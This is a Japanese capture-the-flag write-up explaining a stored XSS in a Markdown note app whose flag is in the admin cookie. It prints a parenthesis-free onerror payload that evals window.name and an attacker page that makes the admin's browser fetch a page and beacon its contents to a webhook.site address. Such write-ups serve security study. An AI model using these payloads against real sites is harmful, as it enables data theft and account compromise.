# Tanuki Udon
Markdown形式でノートを記述して保存できるサービス。フラグは管理者のCookieに保存されている。

MarkdownからHTMLへの変換処理でXSSが発生する。
具体的には、次のノートを記述して保存する。
```md
![[hoge](fuga)]( src=x onerror=alert``//)
```
HTML形式に変換処理がされるページへアクセスすると、次のようにHTMLへ変換され、``` alert`` ```が実行される。
```html
<img alt="<a href=" src=x onerror=alert``//">hoge" src="fuga"></img></a>
```

このように、onerror属性に指定したJavaScriptのコードを実行することができるが、`)`を含むとMarkdown側でリンクのURLの終端として認識される。

よって、`)` を使わずに次のようにして `window.name` をevalするようなノートを作成する。

```md
![[hoge](fuga)]( src=x onerror=[].filter.constructor`/*${window.name}*/```//)
```

最後に管理者側に下記のように `window.name` を設定した後、上記のページを読み込ませるとフラグが書かれたページのURLを取得できる。

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <script>
    window.name = `
    fetch('/').then(r => r.text()).then(t => navigator.sendBeacon('https://webhook.site/e4adfd3b-8a9c-439f-b930-dd229a6d43a8', t));
    `;
    // window.location.href = 'http://localhost:3000/note/09f12f3518d2d384';
    window.location.href = 'http://web:3000/note/0168d445bb38df4c';
  </script>
</body>
</html>
```